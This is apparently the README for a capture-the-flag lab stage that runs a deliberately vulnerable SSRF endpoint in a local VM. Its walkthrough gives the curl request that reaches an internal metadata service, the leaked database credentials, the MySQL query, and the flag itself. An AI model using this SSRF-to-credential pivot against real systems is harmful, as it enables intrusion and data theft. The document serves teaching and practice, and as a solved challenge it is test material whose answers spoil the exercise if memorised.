# Stage 8: Core Infrastructure Breach (Network Pivoting & SSRF)

## 🎯 Challenge Overview
- **Domain:** Network Pivoting & Cloud Metadata SSRF
- **Difficulty:** Hard
- **Points:** 500 XP
- **Target:** NexaCorp Core Infrastructure & Internal Database
- **Delivery:** Ubuntu Virtual Machine (Zero Docker) + In-Browser Terminal (HTB / TryHackMe Style)
- **Flag:** `SHADOWNET{FULL_NETWORK_BREACH_COMPLETE}`

---

## 🏗️ Architecture

```
                                  HOST MACHINE
                   ┌────────────────────────────────────────┐
                   │    Web Browser (HTB / THM Terminal)   │
                   │         http://localhost:7681          │
                   └───────────────────▲────────────────────┘
                                       │ (Interactive Shell)
                                       │
               ┌───────────────────────▼────────────────────────┐
               │              UBUNTU VIRTUAL MACHINE            │
               │                  (QEMU / KVM)                  │
               │                                                │
               │  [Public Perimeter]                            │
               │  • Entry Host Web Portal (Port 3008)           │
               │  • Vulnerable SSRF /fetch endpoint             │
               │                         │                      │
               │                         ▼ (Internal Pivot)     │
               │  [Isolated Subnet: 192.168.100.0/24]           │
               │  • Cloud Metadata Service (192.168.100.10:8080)│
               │  • Production MySQL DB    (192.168.100.10:3306)│
               └────────────────────────────────────────────────┘
```

---

## 🚀 Quick Start (100% Free, Zero Docker)

### Option 1: Full Ubuntu Virtual Machine (QEMU / KVM)
Boots an Ubuntu Server cloud image accelerated with hardware KVM and launches the browser terminal:
```bash
./start_stage8_vm.sh --vm
```
*Tip: To see the visible graphical Ubuntu VM window on your desktop, run with `--gui`:*
```bash
./start_stage8_vm.sh --vm --gui
```

### Option 2: Instant Local Mode (Fastest, Zero Wait)
Starts the isolated challenge services and immediately launches the in-browser Web Terminal:
```bash
./start_stage8_vm.sh --local
```

### Connecting via SSH
Connect directly to the running Ubuntu VM without host key mismatch warnings:
```bash
./ssh_vm.sh
# Password if prompted: password123
```

### Stopping Services
```bash
./stop_stage8_vm.sh
```

### Checking Status
```bash
./status_stage8_vm.sh
```

---

## 💻 In-Browser Terminal (HTB / TryHackMe Experience)
When you run `./start_stage8_vm.sh`:
1. It starts the Ubuntu VM.
2. It launches the WebSocket Web Terminal at `http://localhost:7681`.
3. It automatically opens your default web browser to the terminal.
4. You get:
   - Full interactive xterm.js terminal with colors, bash command execution, and true full-screen mode.
   - Quick-macro action buttons (Probe Entry Host, SSRF DB Creds, SSRF All Metadata, SSH VM Shell).
   - Target status indicators.

---

## ⚔️ Exploitation Walkthrough

### Step 1: Probe the Entry Host
From the browser terminal (or host terminal):
```bash
curl -s http://localhost:3008/ | head -n 15
```

### Step 2: Exploit SSRF to Query Internal Cloud Metadata
The Entry Host exposes a diagnostic URL fetcher at `/fetch?url=<URL>`.
Query the isolated internal metadata service on `192.168.100.10`:
```bash
curl -s "http://localhost:3008/fetch?url=http://192.168.100.10:8080/metadata/db-credentials" | jq .
```
**Output:**
```json
{
  "content": "{\"database\":\"nexacorp\",\"host\":\"192.168.100.10\",\"password\":\"SecurePass123\",\"port\":3306,\"username\":\"db_user\"}\n",
  "status": 200,
  "url": "http://192.168.100.10:8080/metadata/db-credentials"
}
```

### Step 3: Access Isolated Database & Retrieve Flag
Using the credentials retrieved via SSRF (`db_user:SecurePass123`):
```bash
mysql -h 192.168.100.10 -u db_user -pSecurePass123 -D nexacorp -e "SELECT flag FROM flags WHERE challenge='final_breach';"
```
**Flag:**
```
SHADOWNET{FULL_NETWORK_BREACH_COMPLETE}
```

### Step 4: Automated Verification
Run the included test script to verify the solution:
```bash
python3 solve.py
```
